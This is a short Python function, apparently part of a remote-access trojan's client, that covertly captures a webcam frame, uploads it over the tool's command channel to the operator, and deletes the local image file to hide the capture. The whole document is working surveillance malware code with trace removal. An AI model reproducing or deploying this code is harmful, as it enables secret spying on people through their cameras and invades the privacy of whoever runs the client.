def webcam_capture(protocol):
    try:
        import cv2
        cap = cv2.VideoCapture(0)
        ret, frame = cap.read()
        cap.release()
        if not ret or frame is None:
            protocol.send('[-] Webcam capture failed')
            return
        cv2.imwrite('webcam.png', frame)
        from client.modules.file_ops import upload_file
        upload_file(protocol, 'webcam.png')
        import os
        os.remove('webcam.png')
    except Exception:
        protocol.send('[-] Webcam capture failed')
